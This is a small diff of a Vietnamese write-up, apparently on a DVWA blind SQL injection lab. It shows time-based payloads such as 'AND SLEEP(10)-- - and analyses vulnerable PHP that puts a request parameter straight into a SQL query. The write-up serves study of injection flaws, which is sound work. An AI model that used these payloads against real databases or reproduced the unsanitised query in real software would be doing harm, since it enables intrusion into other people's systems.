@@ -27,6 +27,7 @@ Payload `'AND SLEEP(10)-- -` chèn payload làm delay phía DB (SLEEP) để qua
 `'AND SLEEP(10)-- -`
 
 5.) Phân tích source code
+
 `$id = $_GET[ 'id' ];`
 `$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';"`
 
@@ -67,6 +68,7 @@ Payload `AND SLEEP(10)-- -` chèn payload làm delay phía DB (SLEEP) để quan
 `AND SLEEP(10)`
 
 5.) Phân tích source code
+
 `$id = $_POST[ 'id' ];`
 `$id = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $id ) : ((trigger_error("[MySQLConverterToo] Fix the   mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
  // Check database
